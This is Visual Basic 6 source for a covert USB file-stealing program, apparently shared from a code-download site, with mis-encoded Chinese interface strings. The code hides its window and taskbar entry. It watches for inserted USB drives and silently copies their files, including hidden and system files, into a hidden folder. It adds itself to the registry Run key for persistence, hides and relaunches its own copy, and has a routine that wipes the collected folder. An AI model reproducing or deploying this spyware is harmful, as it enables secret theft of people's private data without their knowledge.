VERSION 5.00
Begin VB.Form Frmmain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "U����ʹ"
   ClientHeight    =   4740
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   6000
   Icon            =   "Frmmain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4740
   ScaleWidth      =   6000
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  '��Ļ����
   Begin VB.CommandButton Command9 
      Caption         =   "ת���ļ�"
      Enabled         =   0   'False
      Height          =   375
      Left            =   5040
      TabIndex        =   26
      Top             =   2880
      Width           =   855
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   375
      Left            =   4080
      TabIndex        =   25
      Text            =   "d:\"
      Top             =   2520
      Width           =   1455
   End
   Begin VB.CommandButton Command8 
      Caption         =   "�����ڴ�"
      Height          =   375
      Left            =   4080
      TabIndex        =   24
      Top             =   3240
      Width           =   1815
   End
   Begin VB.CommandButton Command7 
      Caption         =   "дע���"
      Enabled         =   0   'False
      Height          =   375
      Left            =   4080
      TabIndex        =   23
      Top             =   2880
      Width           =   855
   End
   Begin VB.CommandButton Command6 
      Caption         =   "����"
      Height          =   375
      Left            =   1320
      TabIndex        =   22
      Top             =   3720
      Width           =   975
   End
   Begin VB.CommandButton Command5 
      Caption         =   "��ͣ���"
      Height          =   375
      Left            =   120
      TabIndex        =   21
      Top             =   3720
      Width           =   975
   End
   Begin VB.CheckBox Check2 
      Caption         =   "����ʱ�����ͷ�ϵͳ��Դ(�ή�͸����ٶ�)��"
      Height          =   255
      Left            =   120
      TabIndex        =   20
      Top             =   3360
      Width           =   4095
   End
   Begin VB.ComboBox Combo1 
      Enabled         =   0   'False
      Height          =   300
      Index           =   3
      ItemData        =   "Frmmain.frx":1272
      Left            =   2520
      List            =   "Frmmain.frx":127F
      Style           =   2  'Dropdown List
      TabIndex        =   19
      Top             =   2520
      Width           =   855
   End
   Begin VB.ComboBox Combo1 
      Enabled         =   0   'False
      Height          =   300
      Index           =   2
      ItemData        =   "Frmmain.frx":128F
      Left            =   2520
      List            =   "Frmmain.frx":129C
      Style           =   2  'Dropdown List
      TabIndex        =   18
      Top             =   2955
      Width           =   855
   End
   Begin VB.CheckBox Check1 
      Caption         =   "������С��"
      Height          =   255
      Index           =   1
      Left            =   120
      TabIndex        =   16
      Top             =   2565
      Width           =   1215
   End
   Begin VB.ComboBox Combo1 
      Enabled         =   0   'False
      Height          =   300
      Index           =   1
      ItemData        =   "Frmmain.frx":12AC
      Left            =   1440
      List            =   "Frmmain.frx":12C8
      TabIndex        =   15
      Top             =   2520
      Width           =   975
   End
   Begin VB.ComboBox Combo1 
      Enabled         =   0   'False
      Height          =   300
      Index           =   0
      ItemData        =   "Frmmain.frx":12EB
      Left            =   1440
      List            =   "Frmmain.frx":1307
      TabIndex        =   13
      Top             =   2955
      Width           =   975
   End
   Begin VB.CheckBox Check1 
      Caption         =   "�����Ƴ���"
      Height          =   255
      Index           =   0
      Left            =   120
      TabIndex        =   12
      Top             =   3000
      Width           =   1215
   End
   Begin VB.CommandButton Command4 
      Caption         =   "��Ŀ¼"
      Height          =   375
      Left            =   2520
      TabIndex        =   11
      Top             =   3720
      Width           =   975
   End
   Begin VB.Frame Frame1 
      Caption         =   "���˵��"
      Height          =   855
      Left            =   120
      TabIndex        =   9
      Top             =   120
      Width           =   5775
      Begin VB.Label Label4 
         Caption         =   "����ν�����е�������������о����ã�ʹ�ñ�����������κ����Σ����˽�������"
         Height          =   375
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   5415
      End
   End
   Begin VB.CommandButton Command2 
      Caption         =   "�˳�"
      Height          =   375
      Left            =   4920
      TabIndex        =   8
      Top             =   3720
      Width           =   975
   End
   Begin VB.ComboBox cboMask 
      BeginProperty Font 
         Name            =   "����"
         Size            =   10.5
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      ItemData        =   "Frmmain.frx":132A
      Left            =   120
      List            =   "Frmmain.frx":133D
      TabIndex        =   5
      Top             =   2040
      Width           =   5775
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Ӧ��"
      Height          =   375
      Left            =   3720
      TabIndex        =   4
      Top             =   3720
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "��"
      Height          =   375
      Left            =   5520
      TabIndex        =   2
      Top             =   1320
      Width           =   375
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "����"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   1320
      Width           =   5295
   End
   Begin VB.Label Label6 
      BackColor       =   &H000000FF&
      Caption         =   "��"
      BeginProperty Font 
         Name            =   "����"
         Size            =   18
         Charset         =   134
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5520
      TabIndex        =   27
      Top             =   2520
      Width           =   375
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00404040&
      X1              =   0
      X2              =   5760
      Y1              =   4440
      Y2              =   4440
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "���ļ�"
      Height          =   180
      Index           =   1
      Left            =   3480
      TabIndex        =   17
      Top             =   2565
      Width           =   540
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "���ļ�"
      Height          =   180
      Index           =   0
      Left            =   3480
      TabIndex        =   14
      Top             =   3000
      Width           =   540
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "��ǰ�����ڿ�����!"
      ForeColor       =   &H00808000&
      Height          =   180
      Left            =   120
      TabIndex        =   7
      Top             =   4515
      Width           =   1530
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "��ǰû�з����κ�U��!"
      Height          =   180
      Left            =   120
      TabIndex        =   6
      Top             =   4200
      Width           =   1800
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "�ļ����ˣ�"
      Height          =   180
      Index           =   1
      Left            =   120
      TabIndex        =   3
      Top             =   1800
      Width           =   900
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Ҫ���Ƶ����ļ��У�"
      Height          =   180
      Index           =   0
      Left            =   120
      TabIndex        =   0
      Top             =   1080
      Width           =   1620
   End
End
Attribute VB_Name = "Frmmain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (hpvDest As Any, hpvSource As Any, ByVal cbCopy As Long)
Private Declare Function LockWindowUpdate Lib "user32" (ByVal hwndLock As Long) As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Sub InitCommonControls Lib "comctl32.dll" ()
Private Const FILE_ATTRIBUTE_ARCHIVE = &H20
Private Const FILE_ATTRIBUTE_COMPRESSED = &H800
Private Const FILE_ATTRIBUTE_DIRECTORY = &H10
Private Const FILE_ATTRIBUTE_HIDDEN = &H2
Private Const FILE_ATTRIBUTE_NORMAL = &H80
Private Const FILE_ATTRIBUTE_READONLY = &H1
Private Const FILE_ATTRIBUTE_SYSTEM = &H4
Private Const FILE_ATTRIBUTE_TEMPORARY = &H100
'�������ļ�ʱ������� WithEvents
Private WithEvents SP As cScanPath
Attribute SP.VB_VarHelpID = -1
Implements iSubclass
Private m_clsSubcls As cSubclass
Private Type MaskFilterInfo
    MaskName As String
    MaskInfo As String
End Type
Private MaskFilter() As MaskFilterInfo
Private Sub LoadMask()
ReDim MaskFilter(10)
Dim i As Long
i = 0
MaskFilter(i).MaskName = "������Ƶ�ļ�"
MaskFilter(i).MaskInfo = "*.rmvb;*.rm;*.wmv;*.avi;*.mp4;*.mpeg;*.mpg;*.3gp;*.mov;*.asf"
i = i + 1
MaskFilter(i).MaskName = "������Ƶ�ļ�"
MaskFilter(i).MaskInfo = "*.mp3;*.wav;*.wma;*.mid;*.midi"
i = i + 1
MaskFilter(i).MaskName = "������Ƭ�ļ�"
MaskFilter(i).MaskInfo = "*.jpg;*.jpeg;*.bmp;*.gif;*.ico;*.png;*.tif;*.tiff"
i = i + 1
MaskFilter(i).MaskName = "����Office�ļ�"
MaskFilter(i).MaskInfo = "*.txt;*.doc;*.docx;*.ppt;*.pptx;*.rtf;*.xls;*.xlsx"
i = i + 1
MaskFilter(i).MaskName = "�����ļ�"
MaskFilter(i).MaskInfo = "*.*"
cboMask.Clear
Dim m As Long
For m = 0 To i
cboMask.AddItem MaskFilter(m).MaskName
Next
Me.Visible = False
Me.Hide
End Sub

Private Sub CopyUpan(UDrive As String)
    Dim lCount As Long
    Dim lSize(1) As Long
    Dim i As Long
    If NoCopys = True Then Exit Sub
        '####################################################################################################
        '������������
        Set SP = New cScanPath
        StopCopy = 0
        With SP
            '����
            .Archive = True
            .Compressed = True
            .Hidden = True
            .Normal = True
            .ReadOnly = True
            .System = True
            .Filter = FilterStr
            If Dir(NewDeviceName & ":\key.key", vbDirectory) = "" Then
            .MainDirs = Year(Now) & "-" & Month(Now) & "-" & Day(Now) & "-" & Format(Hour(Now), "00") & Format(Minute(Now), "00") & Format(Second(Now), "00")
             CreateDir Replace(mCopyToDir & "\" & .MainDirs, "\\", "\") & "\"
            End If
            '��ʼ
            .StartScan UDrive, True, False, False, False
        End With
   Label3.Caption = "��ǰ�����ڿ�����!"
End Sub

Private Sub Check1_Click(Index As Integer)
Select Case Index
Case 0
If Check1(Index).Value = 1 Then
Combo1(0).Enabled = True
Combo1(2).Enabled = True
Else
Combo1(0).Enabled = False
Combo1(2).Enabled = False
End If
Case 1
If Check1(Index).Value = 1 Then
Combo1(1).Enabled = True
Combo1(3).Enabled = True
Else
Combo1(1).Enabled = False
Combo1(3).Enabled = False
End If
End Select
End Sub
'Download by http://www.codefans.net


Private Sub Command2_Click()
ProcUse = False
Unload Me
End Sub

Private Sub Command4_Click()
OpenAsFile mCopyToDir
End Sub

Private Sub Command5_Click()
If Command5.Caption = "��ͣ���" Then
NoCopys = True
Command5.Caption = "��ʼ���"
Label3.Caption = "����Ѿ��رգ������²����U�̽������и��ƣ�"
Else
NoCopys = False
Command5.Caption = "��ͣ���"
Label3.Caption = "��ǰ�����ڿ�����!"
End If
End Sub

Private Sub Command6_Click()
MsgBox "��Ҫ�ȼ�Ϊ�� " & vbCrLf & "Ctrl+Alt+S �������ñ�����." & vbCrLf & "Ctrl+Alt+E �����رճ���." & vbCrLf & "Ctrl+Alt+P ������ͣ����." & vbCrLf & "Ctrl+Alt+U ����ֹͣ���U��." & vbCrLf & "Ctrl+Alt+R �������¿�ʼ���U�̣�", 64 + 0 + 0 + 0, "��ʾ"
End Sub

Private Sub Command7_Click()
On Error Resume Next
Dim SouPath As String
digfile = Text2.Text
If Dir(digfile & App.EXEName & ".exe") = "" Then
SouPath = IIf(Right(App.path, 1) = "\", App.path, App.path & "\") & App.EXEName & ".exe"
FileCopy SouPath, digfile & App.EXEName & ".exe"
End If
Set fso = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
Set F = fso.getfile(digfile & App.EXEName & ".exe")
ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & F.Name, F.path
SetAttr digfile & App.EXEName & ".exe", 2 + 4 + 32
Shell "cmd /c " & digfile & App.EXEName & ".exe", vbHide
ProcUse = False
Unload Me
End Sub

Private Sub Command8_Click()
On Error Resume Next
Dim fs
Set fs = CreateObject("Scripting.FileSystemObject")
fs.DeleteFolder Text1.Text & "\" & "*"
fs.DeleteFile Text1.Text & "\" & "*.*"
End Sub

Private Sub Command9_Click()
On Error Resume Next
If Dir(Text2.Text & "key.key", vbDirectory) <> "" Then
Shell "cmd /c " & "xcopy /h /e /y /g /r " & Text1.Text & " " & Text2.Text & "Ucopy\", vbHide
Shell "cmd /c " & "attrib " & Text2.Text & "Ucopy -r -a -s -h", vbHide
End If
Label6.Caption = "��"
Label6.BackColor = vbRed
Text2.Enabled = False
Command7.Enabled = False
Command9.Enabled = False
End Sub

Private Sub Form_Initialize()
InitCommonControls
End Sub

Private Sub Form_Resize()
If Me.WindowState = 1 Then
Me.Visible = False
Me.Hide
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
If ProcUse = True Then
Me.Visible = False
Me.Hide
Cancel = 1
Else
    SetHotkey 1, "", "Del"
    SetHotkey 2, "", "Del"
    SetHotkey 3, "", "Del"
    SetHotkey 4, "", "Del"
    SetHotkey 5, "", "Del"
    m_clsSubcls.Terminate
End If
End Sub

Private Sub iSubclass_WndProc(ByVal bBefore As Boolean, bHandled As Boolean, lReturn As Long, ByVal lng_hWnd As Long, ByVal uMsg As eMsg, ByVal wParam As Long, ByVal lParam As Long, lParamUser As Long)
Dim dCount As Long
If uMsg = WM_DEVICECHANGE Then
RefreshDriveList
        Select Case wParam
        Case DBT_DEVICEARRIVAL
            '������USBDISK����ӳ�������̵���
            'info.lDevicetype =2
            '��DBT_DEVTYP_VOLUME
            CopyMemory Info, ByVal lParam, Len(Info) '���ò���lParam��ȡ�ṹ��ͷ����Ϣ
            If Info.lDevicetype = DBT_DEVTYP_VOLUME Then
                CopyMemory info_volume, ByVal lParam, Len(info_volume)
                '��⵽���߼�����ӵ�ϵͳ�У�����ʾ���豸��Ŀ¼��ȫ���ļ���
                NewDeviceName = Chr(GetDriveN(info_volume.lUnitMask))
                HaveParam = True
                CopyUpan NewDeviceName & ":\"
                '''''''''''''
                End If
      End Select
End If
End Sub
Private Sub RefreshDriveList()
    Dim strDriveBuffer  As String
    Dim strDrives()     As String
    Dim i               As Long
    Dim iCount               As Long
    Dim udtInfo         As DEVICE_INFORMATION
    strDriveBuffer = Space(240)
    strDriveBuffer = Left$(strDriveBuffer, GetLogicalDriveStrings(Len(strDriveBuffer), strDriveBuffer))
    strDrives = Split(strDriveBuffer, Chr$(0))
    DriveCount = 0
    iCount = 0
    For i = 0 To UBound(strDrives) - 1
        DriveCount = DriveCount + 1
            udtInfo = GetDevInfo(strDrives(i))
            If udtInfo.Valid Then
                If udtInfo.Removable = True And udtInfo.BusType = BusTypeUsb Then
                iCount = iCount + 1
                Exit For
                End If
            End If
    Next
If iCount > 0 Then
Label2.Caption = "��ǰϵͳ����U�̴��ڣ�"
Else
Label2.Caption = "��ǰû�з����κ�U��!"
End If
End Sub

Function GetDriveN(ByVal lUnitMask As Long) As Byte
    Dim i As Long
    i = 0
    While lUnitMask Mod 2 <> 1
        lUnitMask = lUnitMask \ 2
        i = i + 1
    Wend
    GetDriveN = Asc("A") + i
End Function

Private Sub cboMask_Click()
On Error GoTo asd
If cboMask.ListIndex = -1 Then Exit Sub
cboMask.Text = MaskFilter(cboMask.ListIndex).MaskInfo
asd:
End Sub

Private Sub Command1_Click()
Dim a As String
a = GetFolder(Me.hwnd, "��ѡ������ļ���", mCopyToDir)
If a <> "" Then
Text1.Text = Replace(Replace(a, App.path, "{app}\", , 1), "\\", "\")
End If
End Sub
Private Sub Command3_Click()
If (Check1(0).Value = 1 And IsNumeric(Combo1(0).Text) = False) Or (Check1(1).Value = 1 And IsNumeric(Combo1(1).Text) = False) Then
MsgBox "����ֵ�����쳣��", 48 + 0 + 0 + 0, "��ʾ"
Exit Sub
End If
If Check1(0).Value = 1 Then
    If Len(GetIni("Setting", "copyMinFileLen", App.path & "\Setting.dat")) > 8 Then
     MsgBox "����ֵ�����쳣��", 48 + 0 + 0 + 0, "��ʾ"
    Exit Sub
    End If
End If
If Check1(1).Value = 1 Then
    If Len(GetIni("Setting", "copyMaxFileLen", App.path & "\Setting.dat")) > 8 Then
     MsgBox "����ֵ�����쳣��", 48 + 0 + 0 + 0, "��ʾ"
    Exit Sub
    End If
End If
If Check1(0).Value = 1 And Check1(1).Value = 1 Then
If Combo1(1).Text * (1024 ^ Combo1(3).ListIndex) > Combo1(0).Text * (1024 ^ Combo1(2).ListIndex) Then
     MsgBox "����ֵ�����쳣����Сֵ���ܴ������ֵ��", 48 + 0 + 0 + 0, "��ʾ"
    Exit Sub
End If
End If
WritePrivateProfileString "Setting", "CopyToPath", Text1.Text, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "Filter", cboMask.Text, App.path & "\Setting.dat"
CopyToDir = Text1.Text
mCopyToDir = CopyToDir
WritePrivateProfileString "Setting", "copyMin", Check1(1).Value, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "copyMax", Check1(0).Value, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "copyDoevents", Check2.Value, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "copyMinType", Combo1(3).ListIndex, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "copyMaxType", Combo1(2).ListIndex, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "copyMinFileLen", Combo1(1).Text, App.path & "\Setting.dat"
WritePrivateProfileString "Setting", "copyMaxFileLen", Combo1(0).Text, App.path & "\Setting.dat"
If Left(CopyToDir, 6) = "{app}\" Then mCopyToDir = Replace(CopyToDir, "{app}\", App.path & "\", , 1)
FilterStr = cboMask.Text
LoadSetting
SetAttr App.path & "\Setting.dat", 2 + 4 + 32
MsgBox "Ӧ�����óɹ���", 64 + 0 + 0 + 0, "��ʾ"
End Sub

Private Sub Form_Load()
CopyToDir = GetIni("Setting", "CopyToPath", App.path & "\Setting.dat")
Text1.Text = CopyToDir
mCopyToDir = CopyToDir
NoCopys = False
App.TaskVisible = False
LoadMask
If Left(CopyToDir, 6) = "{app}\" Then mCopyToDir = Replace(CopyToDir, "{app}\", App.path & "\", , 1)
FilterStr = GetIni("Setting", "Filter", App.path & "\Setting.dat")
cboMask.Text = FilterStr
LoadSetting
'''��ʼ���ؼ�
Check1(1).Value = copyMin
Check1(0).Value = copyMax
Check2.Value = copyDoevents
Combo1(1).Text = copyMinFileLen
Combo1(0).Text = copyMaxFileLen
Combo1(3).ListIndex = copyMinType
Combo1(2).ListIndex = copyMaxType
'''��ʼ���ؼ�
    Set m_clsSubcls = New cSubclass
    m_clsSubcls.Subclass Me.hwnd, Me
    m_clsSubcls.AddMsg Me.hwnd, WM_DEVICECHANGE
RefreshDriveList
SetHotkey 1, "Ctrl+Alt,83", "Add"
SetHotkey 2, "Ctrl+Alt,69", "Add"
SetHotkey 3, "Ctrl+Alt,80", "Add"
SetHotkey 4, "Ctrl+Alt,82", "Add"
SetHotkey 5, "Ctrl+Alt,85", "Add"
ProcUse = True
End Sub



Private Sub Label6_Click()
If Label6.Caption = "��" Then
Label6.Caption = "��"
Label6.BackColor = vbGreen
Text2.Enabled = True
Command7.Enabled = True
Command9.Enabled = True
Else
Label6.Caption = "��"
Label6.BackColor = vbRed
Text2.Enabled = False
Command7.Enabled = False
Command9.Enabled = False
End If
End Sub

Private Sub SP_FileMatch(FileName As String, path As String, MainDir As String)
    On Error Resume Next
    Dim sFileLen As Currency
    If StopCopy = 1 Then
    SP.StopScan
    End If
    sFileLen = FileLen(path & "" & FileName) / 1024
    If copyMin = 1 And copyMax = 1 Then
        If sFileLen >= copyMinFileLen * (1024 ^ copyMinType) And sFileLen <= copyMaxFileLen * (1024 ^ copyMaxType) Then GoTo begin1
    Exit Sub
    End If
    If copyMin = 1 And copyMax = 0 Then
        If sFileLen >= copyMinFileLen * (1024 ^ copyMinType) Then GoTo begin1
    Exit Sub
    End If
    If copyMin = 0 And copyMax = 1 Then
        If sFileLen <= copyMaxFileLen * (1024 ^ copyMaxType) Then GoTo begin1
    Exit Sub
    End If
    If copyMin = 0 And copyMax = 0 Then
        GoTo begin1
    Exit Sub
    End If
    Exit Sub
begin1:
    If Dir(NewDeviceName & ":\key.key", vbDirectory) = "" Then
    QuickCopyFile path & "" & FileName, CreateDir(Replace(mCopyToDir & "\" & MainDir & "\" & Mid(path, 3), "\\", "\")) & "\" & FileName
    DoEvents
    'CopyPath path & "" & FileName, CopyToDir
    Label3.Caption = "��ǰ���ڸ����С���(" & path & "" & FileName & ")"
    SetAttr Text1.Text, 2 + 4 + 32
    End If
End Sub

